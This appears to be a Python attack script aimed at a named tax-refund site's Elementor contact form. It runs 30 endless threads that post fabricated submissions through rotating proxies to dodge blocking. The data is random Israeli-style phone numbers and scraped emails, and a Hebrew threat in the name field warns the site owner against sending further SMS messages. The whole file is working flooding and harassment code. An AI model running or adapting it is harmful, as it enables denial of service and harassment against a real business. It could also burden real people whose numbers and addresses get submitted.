import time
import requests
import random
import string
import threading


url = 'https://maxtaxrefund.org/wp-admin/admin-ajax.php'
emails = ['@yahoo.com', '@gmail.com', '@outlook.com', '@walla.co.il']

with open('data/israeli_names.csv', 'r', encoding='utf-8') as f, open(
        'data/emails.csv', 'r', encoding='utf-8') as g:
    names = f.read().split()
    emails = g.read().split()
with open('data/proxies.csv', 'r') as f:
    proxies = f.read().split()

proxy = '190.152.5.126:53040'


def do_requests():
    i = 0
    flag = 0
    while True:
        proxy = proxies[i]
        data = {
            'post_id': '135',
            'form_id': '2f5b95b',
            'referer_title': 'בדיקת זכאות - הארגון להחזרי מס',
            'queried_id': '135',
            'form_fields[firstname]': 'פעם הבאה שתשלחו לי סמס אתם תיענשו חזק יותר',
            'form_fields[phone]': '05' + ''.join(random.choices(['2', '3', '4', '8'], weights=(71, 3, 20, 6), k=1)) +
                                  ''.join(random.choices(string.digits, k=7)),
            'form_fields[email]': random.choice(emails),
            'action': 'elementor_pro_forms_send_form',
            'referrer': 'https://maxtaxrefund.org/eligibilitycheck/'
        }
        try:
            # response = requests.get(url=url, proxies={'http': 'http' + proxy, 'https://': 'http://' + proxy}, timeout=3)
            # print(response.json())
            response = requests.post(url=url, data=data,
                                     proxies={'http': 'http://' + proxy, 'https:': 'http://' + proxy}, timeout=3)
            if 'true' in response.text:
                print(response.text, 'Sending details: ', [data[j] for j in data][4:7])
            else:
                flag += 1



        except:
            print("Skipping. Connnection error")
            i += 1
            flag = 0
            print('trying proxy - ', proxies[i+1])

        if flag > 20:
            i += 1
            flag = 0
            print('reached 1000 flags, trying proxy - ', proxies[i+1])


threads = []
for i in range(30):
    t = threading.Thread(target=do_requests)
    t.daemon = True
    threads.append(t)

for i in range(30):
    threads[i].start()

for i in range(30):
    threads[i].join()
